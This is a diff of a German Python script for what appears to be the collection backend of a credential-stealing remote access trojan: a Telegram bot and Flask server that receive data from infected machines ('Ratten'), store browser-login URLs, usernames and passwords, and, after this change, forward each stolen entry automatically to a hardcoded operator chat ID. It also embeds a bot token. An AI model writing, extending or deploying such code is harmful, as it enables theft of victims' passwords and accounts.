@@ -1,5 +1,4 @@
-# ENI & LO – Der 67-Bot (alles in einer Datei)
-# Bot + Server + Speicherung – keine externe Kommunikation
+# ENI & LO – Der 67-Bot (automatische Daten im Chat)
 
 import os
 import sys
@@ -37,11 +36,11 @@ except ImportError as e:
 # KONFIGURATION
 # ============================================================
 BOT_TOKEN = "8989933992:AAGwMOfvrQPylnxZOrbGLj-BSNAY8MC2MF8"
-SECRET_CODE = "!67?"
 DATA_FILE = "ratten_daten.json"
+MY_CHAT_ID = "8583803376"
 
 # ============================================================
-# SERVER (Flask)
+# SERVER (Flask – läuft im Hintergrund)
 # ============================================================
 app = Flask(__name__)
 
@@ -55,9 +54,12 @@ def save_data(data):
     with open(DATA_FILE, 'w', encoding='utf-8') as f:
         json.dump(data, f, indent=4, ensure_ascii=False)
 
+@app.route('/')
+def index():
+    return "🐀 ENI & LO – Server läuft!"
+
 @app.route('/save', methods=['POST'])
 def save():
-    """Speichert Daten von einer Ratte"""
     try:
         payload = request.json
         ratte_id = payload.get('ratte_id')
@@ -79,18 +81,7 @@ def save():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
-@app.route('/get', methods=['GET'])
-def get():
-    """Gibt alle gespeicherten Daten zurück"""
-    data = load_data()
-    return jsonify(data)
-
-@app.route('/')
-def index():
-    return "🐀 ENI & LO – Server läuft!"
-
 def run_server():
-    """Startet den Flask-Server im Hintergrund"""
     from threading import Thread
     def start():
         app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
@@ -103,53 +94,14 @@ def run_server():
 # ============================================================
 async def handle_message(update: Update, context: CallbackContext):
     user_message = update.message.text
+    chat_id = str(update.message.chat_id)
 
     # ============================================================
-    # 1. GEHEIMER CODE – !67?
-    # ============================================================
-    if user_message == SECRET_CODE:
-        data = load_data()
-        if not data:
-            await update.message.reply_text("📭 Keine Daten vorhanden.")
-            return
-
-        response = "🐀 *ENI & LO – Alle Daten*\n\n"
-        for ratte_id, entries in data.items():
-            response += f"📌 *Ratte {ratte_id}*\n"
-            for entry in entries:
-                data_text = entry.get("data", "")
-                timestamp = entry.get("timestamp", "")
-                source = entry.get("source", "Browser-Login")
-
-                response += f"   📂 {source}\n"
-                if "|" in data_text:
-                    parts = data_text.split("|", 2)
-                    if len(parts) >= 3:
-                        url = parts[0]
-                        user = parts[1]
-                        password = parts[2]
-                        response += f"   🌐 {url}\n"
-                        response += f"   👤 {user}\n"
-                        response += f"   🔑 {password}\n"
-                    else:
-                        response += f"   📋 {data_text}\n"
-                else:
-                    response += f"   📋 {data_text}\n"
-                response += f"   🕒 {timestamp}\n\n"
-
-        if len(response) > 4000:
-            parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
-            for part in parts:
-                await update.message.reply_text(part, parse_mode='Markdown')
-        else:
-            await update.message.reply_text(response, parse_mode='Markdown')
-        return
-
-    # ============================================================
-    # 2. DATEN VON RATTEN – DIREKT SPEICHERN
+    # 1. DATEN VON RATTEN – AUTOMATISCH ANZEIGEN
     # ============================================================
     if user_message.startswith("RATTE:"):
         try:
+            # Daten speichern
             parts = user_message.split("|", 2)
             if len(parts) >= 3:
                 ratte_id = parts[0].replace("RATTE:", "").strip()
@@ -168,6 +120,27 @@ async def handle_message(update: Update, context: CallbackContext):
                 })
                 save_data(all_data)
 
+                # Daten im Chat anzeigen (nur im Chat mit der Chat-ID)
+                if chat_id == MY_CHAT_ID:
+                    response = "🐀 *Neue Daten von Ratte {ratte_id}*\n\n"
+                    if "|" in data_text:
+                        parts_data = data_text.split("|", 2)
+                        if len(parts_data) >= 3:
+                            url = parts_data[0]
+                            user = parts_data[1]
+                            password = parts_data[2]
+                            response += f"   🌐 {url}\n"
+                            response += f"   👤 {user}\n"
+                            response += f"   🔑 {password}\n"
+                        else:
+                            response += f"   📋 {data_text}\n"
+                    else:
+                        response += f"   📋 {data_text}\n"
+                    response += f"   🕒 {timestamp}"
+
+                    await update.message.reply_text(response, parse_mode='Markdown')
+
+                # Immer mit "67" antworten
                 await update.message.reply_text("67")
                 return
         except Exception as e:
@@ -176,7 +149,7 @@ async def handle_message(update: Update, context: CallbackContext):
             return
 
     # ============================================================
-    # 3. ALLE ANDEREN NACHRICHTEN – 67
+    # 2. ALLE ANDEREN NACHRICHTEN – NUR "67"
     # ============================================================
     await update.message.reply_text("67")
 
@@ -184,11 +157,11 @@ async def handle_message(update: Update, context: CallbackContext):
 # MAIN – ALLES STARTEN
 # ============================================================
 def main():
-    print("🐀 ENI & LO – Der 67-Bot (alles in einer Datei)")
+    print("🐀 ENI & LO – Der 67-Bot (automatische Daten im Chat)")
     print("=" * 50)
     print(f"Bot Token: {BOT_TOKEN[:10]}...")
-    print(f"Geheimer Code: {SECRET_CODE}")
     print(f"Daten werden gespeichert in: {DATA_FILE}")
+    print(f"Chat-ID: {MY_CHAT_ID}")
     print("=" * 50)
 
     # Server starten (im Hintergrund)
@@ -202,7 +175,6 @@ def main():
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     print("✅ Bot läuft...")
 
-    # Bot starten (blockiert)
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
